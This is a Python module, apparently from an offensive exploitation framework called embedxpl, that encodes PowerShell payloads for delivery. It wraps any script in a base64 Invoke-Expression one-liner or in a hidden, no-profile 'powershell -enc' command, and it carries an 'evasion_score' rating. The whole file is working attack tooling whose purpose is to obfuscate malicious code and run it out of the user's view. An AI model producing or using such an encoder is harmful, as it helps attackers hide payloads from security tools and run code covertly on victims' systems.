"""PowerShell base64 + IEX encoder."""

import base64
from embedxpl.core.exploit.encoders import BaseEncoder
from embedxpl.core.exploit.payloads import Architectures


class Encoder(BaseEncoder):
    __info__ = {
        "name": "PowerShell Base64 Encoder",
        "description": "Wraps PS1 payload in base64 IEX one-liner. Set encoder.mode = 'iex'|'encoded_cmd'|'file'.",
        "authors": ("André Henrique (@mrhenrike)", "União Geek"),
        "evasion_score": 5,
    }

    architecture = None
    mode: str = "iex"   # 'iex' | 'encoded_cmd' | 'file'

    def encode(self, payload: bytes) -> bytes:  # type: ignore[override]
        ps_script = payload.decode(errors="replace")
        if self.mode == "encoded_cmd":
            enc = base64.b64encode(ps_script.encode("utf-16-le")).decode()
            return f"powershell -nop -w hidden -enc {enc}".encode()
        elif self.mode == "file":
            return ps_script.encode()
        else:  # iex
            enc = base64.b64encode(ps_script.encode()).decode()
            return f'IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{enc}")))'.encode()
